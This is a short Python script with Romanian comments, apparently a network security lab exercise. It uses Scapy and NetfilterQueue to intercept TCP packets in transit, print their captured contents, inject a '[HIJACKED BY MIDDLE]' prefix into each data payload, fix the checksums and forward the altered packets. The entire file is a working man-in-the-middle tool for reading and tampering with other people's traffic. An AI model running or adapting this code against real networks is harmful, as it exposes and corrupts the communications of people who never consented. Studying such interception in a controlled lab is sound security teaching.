from scapy.all import *
from netfilterqueue import NetfilterQueue

# Mesajul pe care il injectam in trafic
HIJACK_MESSAGE = "[HIJACKED BY MIDDLE] "

def process_packet(packet):
    scapy_pkt = IP(packet.get_payload())

    # Verificam daca e TCP si contine date (Raw)
    if scapy_pkt.haslayer(TCP) and scapy_pkt.haslayer(Raw):
        # Decodam payload-ul original
        original_data = scapy_pkt[Raw].load.decode(errors="ignore")
        print(f"[!] Capturat pachet cu payload: {original_data}")

        # Modificam payload-ul: adaugam mesajul nostru la inceput
        new_data = HIJACK_MESSAGE + original_data

        # inlocuim payload-ul
        scapy_pkt[Raw].load = new_data.encode()

        # Corectam lungimile si checksum-urile
        del scapy_pkt[IP].len
        del scapy_pkt[IP].chksum
        del scapy_pkt[TCP].chksum

        print(f"[+] Am modificat payload-ul: {new_data}")

        # Trimitem pachetul modificat mai departe
        packet.set_payload(bytes(scapy_pkt))

    # Acceptam pachetul fie ca l-am modificat sau nu
    packet.accept()

if __name__ == "__main__":
    nfqueue = NetfilterQueue()
    print("[*] Atasez la NFQUEUE, ascult pachete TCP pentru hijacking...")
    nfqueue.bind(1, process_packet)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[*] Oprit hijacking. Eliberez coada.")
        nfqueue.unbind()
